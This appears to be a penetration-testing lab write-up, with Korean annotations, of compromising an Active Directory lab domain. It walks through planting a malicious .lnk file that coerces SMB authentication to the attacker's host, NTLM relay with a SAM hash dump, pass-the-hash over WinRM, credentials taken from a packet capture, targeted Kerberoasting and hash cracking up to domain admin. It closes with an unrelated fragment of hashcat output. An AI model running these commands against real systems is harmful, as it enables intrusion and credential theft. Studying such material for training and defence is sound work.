# Information

## About this lab

Starting with SMB share enumeration, a malicious file is placed to capture hashes. The captured hash can be relayed to another host, granting administrative access. A network capture reveals credentials allowing RDP to the domain controller. BloodHound identifies GenericWrite over a domain admin account, enabling an attack. Cracking a hash provides full domain control.

---

# Proof of Concept

## Information Gathering

### Nmap

`# Nmap 7.98 scan initiated Wed Dec 31 00:56:01 2025 as: /usr/lib/nmap/nmap -Pn -n --open --min-rate 3000 -oN scan 192.168.121.172-174Nmap scan report for 192.168.121.172Host is up (0.12s latency).Not shown: 987 closed tcp ports (reset)PORT     STATE SERVICE53/tcp   open  domain88/tcp   open  kerberos-sec135/tcp  open  msrpc139/tcp  open  netbios-ssn389/tcp  open  ldap445/tcp  open  microsoft-ds464/tcp  open  kpasswd5593/tcp  open  http-rpc-epmap636/tcp  open  ldapssl3268/tcp open  globalcatLDAP3269/tcp open  globalcatLDAPssl3389/tcp open  ms-wbt-server5985/tcp open  wsman Nmap scan report for 192.168.121.173Host is up (0.14s latency).Not shown: 996 closed tcp ports (reset)PORT     STATE SERVICE135/tcp  open  msrpc139/tcp  open  netbios-ssn445/tcp  open  microsoft-ds5985/tcp open  wsman Nmap scan report for 192.168.121.174Host is up (0.13s latency).Not shown: 996 closed tcp ports (reset)PORT     STATE SERVICE135/tcp  open  msrpc139/tcp  open  netbios-ssn445/tcp  open  microsoft-ds5985/tcp open  wsman`

### Host Discovery

`┌──(kali🎃kali)-[~/oscp]└─$ nxc smb 192.168.121.172-174                                         SMB         192.168.121.172 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:laser.com) (signing:True) (SMBv1:False) SMB         192.168.121.174 445    MS02             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS02) (domain:laser.com) (signing:False) (SMBv1:False) SMB         192.168.121.173 445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:laser.com) (signing:False) (SMBv1:False)`

### Hosts file setting

`┌──(kali🎃kali)-[~/oscp]└─$ cat /etc/hosts...192.168.121.172 DC01.laser.com  DC01    laser.com192.168.121.173 MS01.laser.com  MS01    laser.com192.168.121.174 MS02.laser.com  MS02    laser.com`

---

## 192.168.121.173 - MS01

`Eric.Wallows / EricLikesRunning800`

### Initial Access

smb 공유 폴더 열거

- Apps 디렉토리 읽기,쓰기 권한 보유

`┌──(kali🎃kali)-[~/oscp]└─$ nxc smb 192.168.121.173 -u 'Eric.Wallows' -p 'EricLikesRunning800' --sharesSMB         192.168.121.173 445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:laser.com) (signing:False) (SMBv1:False) SMB         192.168.121.173 445    MS01             [+] laser.com\Eric.Wallows:EricLikesRunning800 SMB         192.168.121.173 445    MS01             [*] Enumerated sharesSMB         192.168.121.173 445    MS01             Share           Permissions     RemarkSMB         192.168.121.173 445    MS01             -----           -----------     ------SMB         192.168.121.173 445    MS01             ADMIN$                          Remote AdminSMB         192.168.121.173 445    MS01             Apps            READ,WRITE      SMB         192.168.121.173 445    MS01             C$                              Default shareSMB         192.168.121.173 445    MS01             IPC$            READ            Remote IPC`

Apps 디렉토리에서 lnk 파일 4개 발견

`┌──(kali🎃kali)-[~/oscp]└─$ smbclient //192.168.121.173/Apps/ -U 'laser.com/Eric.Wallows'Password for [LASER.COM\Eric.Wallows]:Try "help" to get a list of possible commands.smb: \> dir  .                                   D        0  Wed Dec 31 01:04:30 2025  ..                                  D        0  Wed Dec 31 01:04:30 2025  Event Viewer.lnk                    A     1168  Sat Sep 15 03:12:46 2018  Print Management.lnk                A     1118  Sat Sep 15 03:13:16 2018  Services.lnk                        A     1158  Sat Sep 15 03:12:52 2018  Task Scheduler.lnk                  A     1132  Sat Sep 15 03:12:23 2018                 10239487 blocks of size 4096. 7366337 blocks available`

---

## 192.168.121.174 - MS02

### Lateral Movement (MS01 to MS02)

사용자가 클릭 시 공격자의 서버로 SMB 인증되도록 설정된 README.lnk 파일을 MS01 SMB 서버에 업로드

`┌──(kali🎃kali)-[~/oscp]└─$ nxc smb 192.168.121.173 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M slinky -o SERVER=192.168.45.159 NAME=README[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loadedSMB         192.168.121.173 445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:laser.com) (signing:False) (SMBv1:False)SMB         192.168.121.173 445    MS01             [+] laser.com\Eric.Wallows:EricLikesRunning800SMB         192.168.121.173 445    MS01             [*] Enumerated sharesSMB         192.168.121.173 445    MS01             Share           Permissions     RemarkSMB         192.168.121.173 445    MS01             -----           -----------     ------SMB         192.168.121.173 445    MS01             ADMIN$                          Remote AdminSMB         192.168.121.173 445    MS01             Apps            READ,WRITESMB         192.168.121.173 445    MS01             C$                              Default shareSMB         192.168.121.173 445    MS01             IPC$            READ            Remote IPCSLINKY      192.168.121.173 445    MS01             [+] Found writable share: AppsSLINKY      192.168.121.173 445    MS01             [+] Created LNK file on the Apps share ┌──(kali🎃kali)-[~/oscp]└─$ smbclient //192.168.121.173/Apps/ -U 'laser.com/Eric.Wallows'Password for [LASER.COM\Eric.Wallows]:Try "help" to get a list of possible commands.smb: \> dir  .                                   D        0  Fri Jan  2 00:52:44 2026  ..                                  D        0  Fri Jan  2 00:52:44 2026  Event Viewer.lnk                    A     1168  Sat Sep 15 03:12:46 2018  Print Management.lnk                A     1118  Sat Sep 15 03:13:16 2018  README.lnk                          A      113  Fri Jan  2 00:52:44 2026  Services.lnk                        A     1158  Sat Sep 15 03:12:52 2018  Task Scheduler.lnk                  A     1132  Sat Sep 15 03:12:23 2018 		10239487 blocks of size 4096. 7367229 blocks available`

NTLM relay 공격에 취약한 호스트 탐색

- 192.168.121.173, 192.168.121.174

`┌──(kali🎃kali)-[~/oscp]└─$ nxc smb 192.168.121.172-174 -u 'Eric.Wallows' -p 'EricLikesRunning800' --gen-relay-list smb_targets.txtSMB         192.168.121.172 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:laser.com) (signing:True) (SMBv1:False)SMB         192.168.121.173 445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:laser.com) (signing:False) (SMBv1:False)SMB         192.168.121.174 445    MS02             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS02) (domain:laser.com) (signing:False) (SMBv1:False)SMB         192.168.121.172 445    DC01             [+] laser.com\Eric.Wallows:EricLikesRunning800SMB         192.168.121.173 445    MS01             [+] laser.com\Eric.Wallows:EricLikesRunning800SMB         192.168.121.174 445    MS02             [+] laser.com\Eric.Wallows:EricLikesRunning800Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00 ┌──(kali🎃kali)-[~/oscp]└─$ cat smb_targets.txt192.168.121.173192.168.121.174`

NTLM Relay 실행

- MS01에서 LASER\carl.dean이 README.lnk 파일을 클릭하여 인증 발생 → MS02(192.168.121.174)로 인증 릴레이됨
    - administrator NTLM 해시 획득
        - 15759746f66f2da88d58f0160f8ee676

`┌──(kali🎃kali)-[~/oscp]└─$ impacket-ntlmrelayx --no-http-server -smb2support -tf smb_targets.txtImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies...[*] Servers started, waiting for connections[*] (SMB): Received connection from LASER/carl.dean at MS01, connection will be relayed after re-authentication[][*] (SMB): Connection from LASER/CARL.DEAN@192.168.121.173 controlled, attacking target smb://192.168.121.173[-] (SMB): Authenticating against smb://192.168.121.173 as LASER/CARL.DEAN FAILED[*] (SMB): Received connection from LASER/carl.dean at MS01, connection will be relayed after re-authentication[ParseResult(scheme='smb', netloc='LASER\\CARL.DEAN@192.168.121.173', path='', params='', query='', fragment='')][*] (SMB): Connection from LASER/CARL.DEAN@192.168.121.173 controlled, attacking target smb://192.168.121.174[*] (SMB): Authenticating connection from LASER/CARL.DEAN@192.168.121.173 against smb://192.168.121.174 SUCCEED [1][*] All targets processed![*] (SMB): Connection from LASER/CARL.DEAN@192.168.121.173 controlled, but there are no more targets left![*] (SMB): Received connection from LASER/carl.dean at MS01, connection will be relayed after re-authentication[*] (SMB): Received connection from LASER/carl.dean at MS01, connection will be relayed after re-authentication[*] All targets processed![*] (SMB): Connection from LASER/CARL.DEAN@192.168.121.173 controlled, but there are no more targets left![*] smb://LASER/CARL.DEAN@192.168.121.174 [1] -> Service RemoteRegistry is in stopped state[*] smb://LASER/CARL.DEAN@192.168.121.174 [1] -> Starting service RemoteRegistry[*] (SMB): Received connection from LASER/carl.dean at MS01, connection will be relayed after re-authentication[*] All targets processed![*] (SMB): Connection from LASER/CARL.DEAN@192.168.121.173 controlled, but there are no more targets left![*] (SMB): Received connection from LASER/carl.dean at MS01, connection will be relayed after re-authentication[*] All targets processed![*] (SMB): Connection from LASER/CARL.DEAN@192.168.121.173 controlled, but there are no more targets left![*] (SMB): Received connection from LASER/carl.dean at MS01, connection will be relayed after re-authentication[*] smb://LASER/CARL.DEAN@192.168.121.174 [1] -> Target system bootKey: 0x99439972b8f85f1d0e63f6603bc9585d[*] smb://LASER/CARL.DEAN@192.168.121.174 [1] -> Dumping local SAM hashes (uid:rid:lmhash:nthash)Administrator:500:aad3b435b51404eeaad3b435b51404ee:15759746f66f2da88d58f0160f8ee676:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:1ebc870a303efa8d64fa1a840025ad84:::[*] smb://LASER/CARL.DEAN@192.168.121.174 [1] -> Done dumping SAM hashes for host: 192.168.121.174[*] smb://LASER/CARL.DEAN@192.168.121.174 [1] -> Stopping service RemoteRegistry`

administrator ntlm 해시를 이용해서 winrm 접속 성공

``┌──(kali🎃kali)-[~/oscp]└─$ evil-winrm -i 192.168.121.174 -u 'administrator' -H '15759746f66f2da88d58f0160f8ee676' Evil-WinRM shell v3.9 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\Administrator\Documents>``

Read proof.txt

`*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txtb54389bba18d7e5bd5c09cfd094718a6*Evil-WinRM* PS C:\Users\Administrator\Desktop> ipconfig Windows IP Configuration Ethernet adapter Ethernet0 2:    Connection-specific DNS Suffix  . :   IPv4 Address. . . . . . . . . . . : 192.168.121.174   Subnet Mask . . . . . . . . . . . : 255.255.255.0   Default Gateway . . . . . . . . . : 192.168.121.254`

### Post-Exploitation

traffic-capture-latest.pcapng 파일 발견

`*Evil-WinRM* PS C:\Users\Administrator\Documents> dir     Directory: C:\Users\Administrator\Documents Mode                LastWriteTime         Length Name----                -------------         ------ -----a----        2/12/2025   6:59 PM        1365464 traffic-capture-latest.pcapng`

traffic-capture-latest.pcapng 파일 내 HTTP 패킷에서 계정 정보 발견

- yulia.weber / Yulia@Laser777

`POST /login HTTP/1.1Host: 192.168.118.2:5000User-Agent: curl/8.11.1Accept: */*Content-Length: 44Content-Type: application/x-www-form-urlencoded username=yulia.weber&password=Yulia@Laser777`

Eric.Wallows를 Administrators 그룹에 추가

`*Evil-WinRM* PS C:\Users\Administrator\Documents> net localgroup 'Administrators' Eric.Wallows /addThe command completed successfully.`

SharpHound 정보 수집

- The user [YULIA.WEBER@LASER.COM](https://xn--ec6b17t.com/mailto:YULIA.WEBER@LASER.COM) has “GenericWrite” access to the user [BORIS.CRAWFORD@LASER.COM](https://xn--ec6b17t.com/mailto:BORIS.CRAWFORD@LASER.COM).
    - Alternatively, GenericWrite enables [YULIA.WEBER@LASER.COM](https://xn--ec6b17t.com/mailto:YULIA.WEBER@LASER.COM) to set a ServicePrincipalName (SPN) on the targeted user, which may be abused in a Targeted Kerberoast attack.

`*Evil-WinRM* PS C:\Users\Administrator\Documents> .\SharpHound.exe --ldapusername Eric.Wallows --ldappassword EricLikesRunning8002026-01-02T06:42:45.2815406+00:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound2026-01-02T06:42:45.4065388+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo2026-01-02T06:42:45.4221623+00:00|INFORMATION|Initializing SharpHound at 6:42 AM on 1/2/20262026-01-02T06:42:45.4534128+00:00|INFORMATION|Resolved current domain to laser.com2026-01-02T06:42:45.5784071+00:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo2026-01-02T06:42:45.6565325+00:00|INFORMATION|Beginning LDAP search for laser.com2026-01-02T06:42:45.6565325+00:00|INFORMATION|Collecting AdminSDHolder data for laser.com2026-01-02T06:42:45.7034591+00:00|INFORMATION|AdminSDHolder ACL hash 7653C4DBD90F3CAFD21E8AA25C347A6B56880941 calculated for laser.com.2026-01-02T06:42:45.7971548+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for LASER.COM2026-01-02T06:42:45.7971548+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for LASER.COM...2026-01-02T06:42:58.4219425+00:00|INFORMATION|Saving cache with stats: 14 ID to type mappings. 0 name to SID mappings. 1 machine sid mappings. 3 sid to domain mappings. 0 global catalog mappings.2026-01-02T06:42:58.4688175+00:00|INFORMATION|SharpHound Enumeration Completed at 6:42 AM on 1/2/2026! Happy Graphing!`

---

## 192.168.121.172 - DC01

### Lateral Movement (MS02 to DC01)

커버로스팅 수행

- boris.crawford의 해시 획득

`┌──(kali🎃kali)-[~/oscp/targetedKerberoast]└─$ ./targetedKerberoast.py -v -d 'laser.com' -u 'yulia.weber' -p 'Yulia@Laser777'[*] Starting kerberoast attacks[*] Fetching usernames from Active Directory with LDAP[VERBOSE] SPN added successfully for (boris.crawford)[+] Printing hash for (boris.crawford)$krb5tgs$23$*boris.crawford$LASER.COM$laser.com/boris.crawford*$b04a433f61b2a33ac5fa54aff0664684$156a6715061a421f196a676caa924e3790a5b3dd9ca1bfe54a5d1cba6c9aafa19998d8516df20012e9c5953dbd812ddd3bbca9a21766390b79342a8a20831c5937a80d82badc0d288b99fd0906dc074b27f7ec4b9fe591eaa05343768766ba6d57dae0db637dd952a2b39cefc23fb18be7dfb4438836781613f96a5a400afaab883f42c0918e1a0ed1782f81b363618b2e807a5ffc80e38c537c71fda055141dc4a16824608ab7a5fbadaf52dd35f266482b98a6891d58afb9543235ef141fbe729ca8b73d8fd23fa0ea01dab56bcfc284a6d59d3641a0b3fe67e02ddfbc5f413fba86ecf462de4a7c9e0b32477b85ec728524865d374c5aa9b0acb71def2457b98a3fe3365f7182f839bf3ff600e751a2fbfd721885adccb211fd52cc030c9925db734625ca9064ad0a759c19cf39dce9597dd645ba1c35a1a07921c34a1f99655987aeb708cd1ebfa37033c6ff42804da282db143b022cab3dc993cee782f629aa45d0ebc00065ebba707edd716324a664a6891523b67d373339660f8bb90e1671759e8e9b9f7693a1915245f6c007cffda420dfbc397b085eb7dc629deea3a170a22e3afeba846518d1acc35f7945aefa5b1bf89bc07525029fa2ef054308ec32d8f425d20517516bf1772736c31dc51dd8c3a2fddaf622c3afff3d675348784d8324fe630ad01c05b51874358995cd22adf4c74f13f1a38166498095646d01a5c942e2b46e4ef2efea2ca0e211e2825ad86f925900a0f5e1888e59ef977a3968181175d8137561159758ce44a32d394c83aef0dc42170f14c11f1e202f10d2aaa13b3627cb316dede65fd38aad727765e3bb4fef88042e3fd01b7353fd936efbf5bfbac2fb0d872cfd9714615a6f6a03027f3833cf8f32b0ff26fb05f4a0f0bdeb51350a271cb000cadeead76249a97b98f935897be77a3d7b090c944bd3f43a83eab1b29924a3b08d9a6d4161d8562bd8973440a6d16fe3f5bcd50cf1332dc64c508558954354a48c21ca60983c758f2d04dd519bd16ea1ca63d0be159e8fac2799b9909fb231e5079e0411e5116876009eba408e403278a920783ea22870afc9417fd2a9a70f08be16fca5ca826c241a02012c84375b68a95c1dada656bf58322430496940aa746dd803835a070e8347ed23d96f7ba81f786b42aaeb8884a1ed7c96053fe7e38dfe8fbba0075706ff77bf5051e2b0e101d35f85f1760fd15133baaba99a063af39d61b555b8e443c306870ad7b1fc4c8a68b818379d175f4c0feff3bca27c92c94d020f5acdae2c3f24e45a8d3d706dad1cc8b7[VERBOSE] SPN removed successfully for (boris.crawford)`

해시 크랙

- boris.crawford / zxcvbnm

`┌──(kali🎃kali)-[~/oscp]└─$ hashcat -m 13100 boris.hash /usr/share/wordlists/rockyou.txt --quiet$krb5tgs$23$*boris.crawford$LASER.COM$laser.com/boris.crawford*$b04a433f61b2a33ac5fa54aff0664684$156a6715061a421f196a676caa924e3790a5b3dd9ca1bfe54a5d1cba6c9aafa19998d8516df20012e9c5953dbd812ddd3bbca9a21766390b79342a8a20831c5937a80d82badc0d288b99fd0906dc074b27f7ec4b9fe591eaa05343768766ba6d57dae0db637dd952a2b39cefc23fb18be7dfb4438836781613f96a5a400afaab883f42c0918e1a0ed1782f81b363618b2e807a5ffc80e38c537c71fda055141dc4a16824608ab7a5fbadaf52dd35f266482b98a6891d58afb9543235ef141fbe729ca8b73d8fd23fa0ea01dab56bcfc284a6d59d3641a0b3fe67e02ddfbc5f413fba86ecf462de4a7c9e0b32477b85ec728524865d374c5aa9b0acb71def2457b98a3fe3365f7182f839bf3ff600e751a2fbfd721885adccb211fd52cc030c9925db734625ca9064ad0a759c19cf39dce9597dd645ba1c35a1a07921c34a1f99655987aeb708cd1ebfa37033c6ff42804da282db143b022cab3dc993cee782f629aa45d0ebc00065ebba707edd716324a664a6891523b67d373339660f8bb90e1671759e8e9b9f7693a1915245f6c007cffda420dfbc397b085eb7dc629deea3a170a22e3afeba846518d1acc35f7945aefa5b1bf89bc07525029fa2ef054308ec32d8f425d20517516bf1772736c31dc51dd8c3a2fddaf622c3afff3d675348784d8324fe630ad01c05b51874358995cd22adf4c74f13f1a38166498095646d01a5c942e2b46e4ef2efea2ca0e211e2825ad86f925900a0f5e1888e59ef977a3968181175d8137561159758ce44a32d394c83aef0dc42170f14c11f1e202f10d2aaa13b3627cb316dede65fd38aad727765e3bb4fef88042e3fd01b7353fd936efbf5bfbac2fb0d872cfd9714615a6f6a03027f3833cf8f32b0ff26fb05f4a0f0bdeb51350a271cb000cadeead76249a97b98f935897be77a3d7b090c944bd3f43a83eab1b29924a3b08d9a6d4161d8562bd8973440a6d16fe3f5bcd50cf1332dc64c508558954354a48c21ca60983c758f2d04dd519bd16ea1ca63d0be159e8fac2799b9909fb231e5079e0411e5116876009eba408e403278a920783ea22870afc9417fd2a9a70f08be16fca5ca826c241a02012c84375b68a95c1dada656bf58322430496940aa746dd803835a070e8347ed23d96f7ba81f786b42aaeb8884a1ed7c96053fe7e38dfe8fbba0075706ff77bf5051e2b0e101d35f85f1760fd15133baaba99a063af39d61b555b8e443c306870ad7b1fc4c8a68b818379d175f4c0feff3bca27c92c94d020f5acdae2c3f24e45a8d3d706dad1cc8b7:zxcvbnm`

boris.crawford 계정으로 DC01에 winrm 접속 성공

``┌──(kali🎃kali)-[~/oscp]└─$ evil-winrm -i 192.168.121.172 -u 'boris.crawford' -p 'zxcvbnm' Evil-WinRM shell v3.9 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\boris.crawford\Documents>``

boris.crawford이 관리자 권한 있는 것을 확인

`*Evil-WinRM* PS C:\Users\boris.crawford\Documents> whoami /groups GROUP INFORMATION----------------- Group Name                                   Type             SID                                           Attributes============================================ ================ ============================================= ===============================================================Everyone                                     Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled groupBUILTIN\Users                                Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled groupBUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled groupBUILTIN\Administrators                       Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group ownerNT AUTHORITY\NETWORK                         Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\This Organization               Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled groupLASER\Domain Admins                          Group            S-1-5-21-2287908098-1562398632-3078353732-512 Mandatory group, Enabled by default, Enabled groupLASER\Denied RODC Password Replication Group Alias            S-1-5-21-2287908098-1562398632-3078353732-572 Mandatory group, Enabled by default, Enabled group, Local GroupNT AUTHORITY\NTLM Authentication             Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled groupMandatory Label\High Mandatory Level         Label            S-1-16-12288` 

Read local.txt

`*Evil-WinRM* PS C:\Users\yulia.weber\Desktop> type local.txt5f11293805deac5556d50d4e731c0d31*Evil-WinRM* PS C:\Users\yulia.weber\Desktop> ipconfig Windows IP Configuration Ethernet adapter Ethernet0 2:    Connection-specific DNS Suffix  . :   IPv4 Address. . . . . . . . . . . : 192.168.121.172   Subnet Mask . . . . . . . . . . . : 255.255.255.0   Default Gateway . . . . . . . . . : 192.168.121.254`

Read proof.txt

`*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txtc18c87ea5751fb35685e24b73cff4658*Evil-WinRM* PS C:\Users\Administrator\Desktop> ipconfig Windows IP Configuration Ethernet adapter Ethernet0 2:    Connection-specific DNS Suffix  . :   IPv4 Address. . . . . . . . . . . : 192.168.121.172   Subnet Mask . . . . . . . . . . . : 255.255.255.0   Default Gateway . . . . . . . . . : 192.168.121.254


```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ hashcat -a 0 -m 1000 206.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 9800X3D 8-Core Processor, 6970/13940 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 5 digests; 4 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

INFO: Removed hash found as potfile entry.

Host memory allocated for this attack: 513 MB (11825 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 206.hash
Time.Started.....: Sun Mar 22 03:59:48 2026 (2 secs)
Time.Estimated...: Sun Mar 22 03:59:50 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  6584.7 kH/s (0.18ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/4 (25.00%) Digests (total), 0/4 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...:  kristenanne -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 25%

Started: Sun Mar 22 03:59:48 2026
Stopped: Sun Mar 22 03:59:52 2026

```


```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ cat 206.hash                         
3687f62e3dfb4b4f1fde5fe575df55d6
31d6cfe0d16ae931b73c59d7e0c089c0
31d6cfe0d16ae931b73c59d7e0c089c0
5403e400be738dd915e176be5da78216
b61f5652d592b2a7b07e70d2a3efce9e

```